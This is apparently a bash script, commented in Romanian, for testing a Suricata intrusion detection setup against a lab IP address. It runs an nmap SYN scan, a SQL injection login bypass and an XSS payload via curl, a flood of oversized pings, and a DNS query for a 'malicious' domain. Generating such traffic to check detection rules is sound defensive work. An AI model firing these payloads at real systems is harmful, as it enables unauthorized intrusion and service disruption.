#!/bin/bash


TARGET_IP="192.168.149.174"  


DELAY_SECONDS=3

echo "Începem testarea Suricata! Vor fi trimise mai multe requesturi către: $TARGET_IP"


echo "Executăm SYN Scan cu nmap..."
nmap -sS $TARGET_IP &
sleep $DELAY_SECONDS


echo "Executăm SQL Injection..."
curl -s "http://$TARGET_IP:3000/api/my/user/login?user=admin&password=' OR 1=1 --"
sleep $DELAY_SECONDS


echo "Executăm atac XSS..."
curl -s "http://$TARGET_IP:3000/api/my/user/login/comment?msg=<script>alert('Hacked')</script>"
sleep $DELAY_SECONDS

echo "Executăm Ping Flood..."
for i in {1..10}; do
    ping -c 1 -s 65500 $TARGET_IP &
    sleep 0.3
done
sleep $DELAY_SECONDS


echo "Executăm interogare DNS malițioasă..."
dig @${TARGET_IP} maliciousdomain.com
sleep $DELAY_SECONDS

echo "Testele au fost executate! Verifică logurile Suricata pentru alerte."
